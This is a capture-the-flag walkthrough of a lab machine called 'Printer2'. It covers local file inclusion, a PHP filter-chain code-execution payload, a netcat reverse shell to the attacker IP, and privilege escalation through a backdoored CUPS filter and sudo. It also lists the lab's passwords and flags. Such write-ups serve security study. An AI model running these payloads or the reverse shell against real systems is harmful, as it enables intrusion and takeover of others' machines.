+++
title = "Printer2 - Walkthrough"
date = "2026-07-14"
author = "nvru"
description = "Walkthrough for the Printer2 machine."
tags = [
"ctf",
"walkthrough",
"linux",
"apache",
"cups",
"lfi",
"php-filter-chain",
"command-injection",
"ssh",
"sudo",
"privilege-escalation"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.23`

The objective was to enumerate the target, identify exposed services, gain initial access through a Local File Inclusion (LFI) vulnerability combined with a PHP filter chain, and escalate privileges by abusing a backdoored CUPS filter together with an insecure sudo configuration.

![Machine information](/images/hmv/printer2/vm.png)

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.10.10.23 -- -sC -sV -A -oA nmap/rust
```

#### Results

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
631/tcp open  ipp     CUPS 2.3
```

Only three services were exposed:

- SSH
- Apache HTTP
- CUPS (IPP)

Since SSH required valid credentials, web enumeration was the obvious starting point.

---

### Web Enumeration

Browsing to the website revealed a simple hardware store homepage.

![Homepage](/images/hmv/printer2/http.png)

While inspecting the page source, I discovered a hostname that appeared to be intended as a virtual host.

Adding the hostname to `/etc/hosts`:

```text
10.10.10.23 printer4life.printer.hmv
```

![Editing /etc/hosts](/images/hmv/printer2/etc_hosts.png)

After visiting the new host, a different page was displayed containing the message:

> I love printers so much! I print every minute.

along with several printer-related links.

![Virtual host](/images/hmv/printer2/vhost.png)

---

### Local File Inclusion

The application accepted a `page` parameter, making it a good candidate for Local File Inclusion testing.

The vulnerability was confirmed immediately:

```bash
curl -s 'http://printer4life.printer.hmv/index.php?page=/etc/passwd' | tail -n 33 | bat -l html
```

![LFI](/images/hmv/printer2/lfi.png)

Reading `/etc/passwd` revealed two interesting users:

- `mabelle`
- `kierra`

![Users from /etc/passwd](/images/hmv/printer2/lfi_users.png)

---

### PHP Filter Chain Remote Code Execution

After confirming the Local File Inclusion vulnerability, I first tested whether PHP stream wrappers were enabled by using the `php://filter` wrapper to read and encode the contents of `index.php`.

```bash
curl 'http://printer4life.printer.hmv/index.php?page=php://filter/convert.base64-encode/resource=index.php'
```

The request was successful, confirming that PHP filters could be used through the vulnerable `page` parameter.


![Check php filter](/images/hmv/printer2/filter_suc.png)

With the ability to include PHP streams, I attempted to escalate the LFI into Remote Code Execution using a PHP filter chain.

Reference:

- https://github.com/synacktiv/php_filter_chain_generator

The payload was generated using the following command:

```bash
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]` ?>'
```

The generated filter chain was then supplied through the `page` parameter, allowing PHP code execution.

To obtain a reverse shell, I used:

```bash
curl -s "http://printer4life.printer.hmv/index.php?page=<generated_payload>&0=nc+-e+/bin/bash+10.10.10.2+9001"
```

The command executed successfully, resulting in a reverse shell as `www-data`.

![Command execution](/images/hmv/printer2/whoami.png)

![Reverse shell](/images/hmv/printer2/shell.png)

---

## Privilege Escalation

### www-data → mabelle

After gaining command execution as `www-data`, I started enumerating the filesystem looking for credentials or sensitive information.

The default web root (`/var/www/html`) did not contain anything useful. However, the virtual host directory contained credentials belonging to `mabelle`.

![Recovered password](/images/hmv/printer2/mabelle_passwd.png)

Using the recovered password, I switched to the `mabelle` user.

```bash
su - mabelle
```

After enumerating Mabelle's home directory, I found an SSH private key, allowing me to establish a stable SSH session.

![SSH private key](/images/hmv/printer2/mabelle_ssh.png)

Recovered credentials:

```text
Username: mabelle
Password: LIrmxk8EYtD
```

SSH authentication was successful.

![SSH login](/images/hmv/printer2/ssh_mabelle.png)

---

### mabelle → kierra

The first thing I checked was sudo permissions.

```bash
sudo -l
```

Mabelle had no sudo privileges.

![No sudo permissions](/images/hmv/printer2/no_sudo.png)

Checking locally listening ports revealed an unusual service on port **1001**.

```bash
ss -lntp
```

![Open ports](/images/hmv/printer2/ports.png)

Connecting to it with Netcat displayed a message mentioning that a backdoor had been added to a printer filter.

![Backdoor service](/images/hmv/printer2/1001.png)

Searching the filesystem revealed a CUPS source tree inside `/opt`.

![CUPS source](/images/hmv/printer2/opt_cups.png)

To identify the modifications, I archived the source code:

```bash
tar cvf /tmp/cups.tar cups-2.3.3/
```

I then downloaded the official CUPS 2.3.3 source code from GitHub and compared the two directories.

```bash
diff -ruN origin/filter/ back/filter/ | less -R
```

The comparison revealed a backdoored printer filter.

![Backdoored source](/images/hmv/printer2/found_back.png)

Interacting with the service on port **1001** produced another password.

The credentials did not work for `root`, but they successfully authenticated as `kierra`.

```text
Username: kierra
Password: wK4EyQ15Cga
```

![Recovered kierra password](/images/hmv/printer2/kierrar_passwd.png)

---

### kierra → root

The first thing I checked after switching users was sudo permissions.

```bash
sudo -l
```

The user could execute the following binary without supplying a password:

```text
/usr/lib/cups/filter/rastertopwg
```

![Sudo permissions](/images/hmv/printer2/sudo_kierrar.png)

This binary matched the backdoored filter discovered during the source code comparison.

Executing the binary with the hidden backdoor parameter through `sudo` resulted in a root shell.

![Root shell](/images/hmv/printer2/su_root.png)

---

## Credentials

```text
mabelle:LIrmxk8EYtD

kierra:wK4EyQ15Cga
```

---

## Flags

```text
user:63e2f2ec7e3dbae87afc4e0e86d0867b

root:052cf26a6e7e33790391c0d869e2e40c
```
